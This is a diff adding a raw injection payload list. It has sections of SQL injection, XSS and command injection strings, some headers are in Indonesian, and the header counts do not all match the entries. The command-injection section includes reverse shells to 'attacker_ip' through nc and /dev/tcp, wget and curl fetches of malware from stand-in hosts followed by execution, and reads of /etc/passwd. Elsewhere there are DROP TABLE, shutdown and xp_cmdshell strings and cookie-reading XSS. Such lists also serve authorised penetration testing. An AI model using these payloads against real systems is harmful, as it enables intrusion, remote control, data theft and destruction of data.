@@ -1,0 +1,202 @@
+# SQL Injection Payloads (70)
+' OR '1'='1
+' OR '1'='1' -- 
+' OR '1'='1'/*
+' OR '1'='1'--
+' OR '1'='1'#
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' OR 1=1;--
+'; DROP TABLE users; --
+'; EXEC xp_cmdshell('dir');--
+" OR "1"="1
+" OR "1"="1" -- 
+" OR "1"="1"/*
+' OR 1=1
+" OR 1=1
+' OR 'x'='x
+" OR "x"="x
+' OR 1=1--+
+" OR 1=1--+
+' OR '1'='1' /*
+" OR "1"="1" /*
+' OR '1'='1' -- -
+" OR "1"="1" -- -
+' OR ''='
+" OR ""=""
+' OR 'a'='a
+" OR "a"="a
+' OR '1'='1'-- 
+" OR "1"="1"-- 
+' OR 'test'='test
+" OR "test"="test
+' OR 1=1 OR 'a'='a
+" OR 1=1 OR "a"="a
+' OR 1=1-- -
+" OR 1=1-- -
+' OR 1=1-- /
+" OR 1=1-- /
+' OR 1=1%00
+" OR 1=1%00
+' OR 1=1%2d%2d
+" OR 1=1%2d%2d
+' OR 1=1%23
+" OR 1=1%23
+' OR 1=1/*
+" OR 1=1/*
+' OR 'x'='x' -- 
+" OR "x"="x" -- 
+' OR 'x'='x'/*
+" OR "x"="x"/*
+' OR 1=1 --
+" OR 1=1 --
+' OR 1=1 ---
+" OR 1=1 ---
+' OR 1=1;--
+" OR 1=1;--
+' OR 1=1; #
+" OR 1=1; #
+' OR 1=1;/*
+" OR 1=1;/*
+' OR '1'='1' OR ''='
+" OR "1"="1" OR ""=""
+' OR '1'='1' OR 'x'='x
+" OR "1"="1" OR "x"="x
+' OR '1'='1' OR 'test'='test
+" OR "1"="1" OR "test"="test
+' OR (1=1)
+" OR (1=1)
+# XSS Payloads (40)
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+javascript:alert(1)
+<iframe src='javascript:alert(1)'></iframe>
+<body onload=alert(1)>
+<marquee onstart=alert(1)>
+<math><mtext onmouseover=alert(1)>
+<embed src='data:text/html,<script>alert(1)</script>'>
+<object data='data:text/html,<script>alert(1)</script>'></object>
+<img src=x onerror=alert(1) />
+<svg><script>alert(1)</script></svg>
+<details open ontoggle=alert(1)>
+<form onsubmit=alert(1)>
+<input autofocus onfocus=alert(1)>
+<div onmouseover=alert(1)>Hover me</div>
+<a href='javascript:alert(1)'>Click me</a>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<link rel='stylesheet' href='javascript:alert(1)'>
+<img src='invalid' onerror='alert(1)'>
+<embed onerror=alert(1)>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<body onload=alert(String.fromCharCode(88,83,83))>
+<iframe src='javascript:alert(String.fromCharCode(88,83,83))'></iframe>
+<img src='x' onerror='alert(document.cookie)'>
+<script>alert(document.domain)</script>
+<svg><script>alert(document.domain)</script></svg>
+<img src=x onerror=alert(document.domain)>
+<script>eval('alert(1)')</script>
+<img src='x' onerror='eval("alert(1)")'>
+<script>setTimeout(function(){alert(1)},0)</script>
+<img src=x onerror='setTimeout(function(){alert(1)},0)'>
+<svg onload='setTimeout(function(){alert(1)},0)'>
+<body onload='setTimeout(function(){alert(1)},0)'>
+<input type='text' onfocus='alert(1)' autofocus>
+<textarea onfocus='alert(1)'></textarea>
+# Command Injection / Lainnya (43)
+`; ls -la`
+`; cat /etc/passwd`
+`; uname -a`
+`; id`
+`; whoami`
+`; netstat -an`
+`; ps aux`
+`; ping -c 4 127.0.0.1`
+`; wget http://malicious.com/malware`
+`; curl http://malicious.com/malware`
+`; nc -e /bin/sh attacker_ip 4444`
+`; /bin/sh -i`
+`; /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'`
+`; python -c 'import os; os.system("id")'`
+`; perl -e 'system("id")'`
+`; ruby -e 'puts \`id\`'`
+`; echo test`
+`; echo 'vulnerable'`
+`; sleep 10`
+`; ping -c 10 127.0.0.1`
+`; nc -zv attacker_ip 80`
+`; telnet attacker_ip 80`
+`; bash -i > /dev/tcp/attacker_ip/4444 0<&1 2>&1`
+`; /bin/sh -i >& /dev/tcp/attacker_ip/4444 0>&1`
+`; wget http://attacker_ip/malware -O /tmp/m.sh`
+`; curl -o /tmp/m.sh http://attacker_ip/malware`
+`; chmod +x /tmp/m.sh && /tmp/m.sh`
+`; python -c 'import pty; pty.spawn("/bin/bash")'`
+`; exec /bin/sh`
+`; /usr/bin/id`
+`; /usr/bin/whoami`
+`; echo '$(id)'`
+`; $(ls -la)`
+`; $(uname -a)`
+`; $(cat /etc/passwd)`
+`; $(netstat -an)`
+`; $(ps aux)`
+`; $(ping -c 1 127.0.0.1)`
+`; $(echo vulnerable)`
+`; `ls -la``
+`; `cat /etc/passwd``
+`; `uname -a``
+`; `id``
+# Lain-lain & Varian (47)
+admin'--
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1' -- 
+admin' or '1'='1'/*
+' OR 1=1 AND ''='
+" OR 1=1 AND ""="
+' OR 1=1 AND 'x'='x
+" OR 1=1 AND "x"="x
+<script>document.write('XSS')</script>
+<IMG SRC=javascript:alert('XSS')>
+<BODY ONLOAD=alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<iframe src='javascript:alert(1)'></iframe>
+'; shutdown --
+"; shutdown --
+'; reboot --
+"; reboot --
+' OR EXISTS(SELECT * FROM users) --
+" OR EXISTS(SELECT * FROM users) --
+' OR NOT EXISTS(SELECT * FROM users) --
+" OR NOT EXISTS(SELECT * FROM users) --
+' OR 1=1 UNION SELECT NULL--
+" OR 1=1 UNION SELECT NULL--
+' OR 1=1 UNION ALL SELECT NULL--
+" OR 1=1 UNION ALL SELECT NULL--
+'; EXEC sp_executesql N'select * from users'--
+"; EXEC sp_executesql N'select * from users'--
+' OR 1=1 LIMIT 1--
+" OR 1=1 LIMIT 1--
+' OR 1=1 OFFSET 1--
+" OR 1=1 OFFSET 1--
+' OR (SELECT 1) = (SELECT 1)--
+" OR (SELECT 1) = (SELECT 1)--
+' OR (SELECT COUNT(*) FROM users) > 0--
+" OR (SELECT COUNT(*) FROM users) > 0--
+<script>alert(/XSS/)</script>
+<script>alert('XSS vulnerability')</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+'; exec master..xp_cmdshell 'dir';--
+"; exec master..xp_cmdshell 'dir';--
+'; drop table if exists users;--
+"; drop table if exists users;--
+' OR SLEEP(5)--
+" OR SLEEP(5)--
